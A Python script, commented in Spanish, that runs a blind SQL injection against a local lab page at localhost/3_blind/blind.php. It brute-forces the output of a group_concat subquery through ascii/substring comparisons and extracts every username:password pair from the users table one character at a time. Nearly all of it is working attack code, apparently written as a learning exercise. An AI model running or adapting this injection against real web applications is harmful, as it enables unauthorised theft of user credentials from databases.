#!/usr/bin/env python3

"""
Se añade un sub query que nos permita modificar el parámetro username, para que podamos ver todos los usuarios correpondientes por cómo funciona la función group_concat() además de que ahora con esto podemos ver las username and passwords
"""

from pwn import *
import signal, sys, requests, time

# ctrl_c esto es para poner el ctr_c para poder 
def ctrl_c(sig, frame):
    print("\n\t[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# ------------------------------------
# Variables globales
main_url = "http://localhost/3_blind/blind.php"

# -------------
def makesqli():
    # Ciclo for que prueba la longitud de la contraseña 
    p1 = log.progress("Iniciando fuerza bruta") # Se crea una barra de progreso
    p1.status("SQLinjection") # Se actualiza el estado de la barra
    time.sleep(2)
    p2 = log.progress("Los datos extraídos de la base de datos: ") # Se crea una nueva barra de progreso para la información extrída
    info_sqli = "" # String que almacena los datos obtenidos

    for position in range(1,100):
        for character in range(33,127): # 33 del código ascii hasta el valor 126 del código ascii
            sqli_url = main_url + "?id=15 or (select (select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1) = %d)" % (position, character)
            p1.status(sqli_url) # barra de progeso que nos ayuda a ver la petición que se está haciendo

            r = requests.get(sqli_url) # Petición con get 
            if r.status_code == 200: # si la solicitud es correcta
                info_sqli+=chr(character) # Se le suma el caracter a las string que va llevando el valor de la string
                p2.status(info_sqli)
                break

if __name__ == "__main__":
    makesqli()
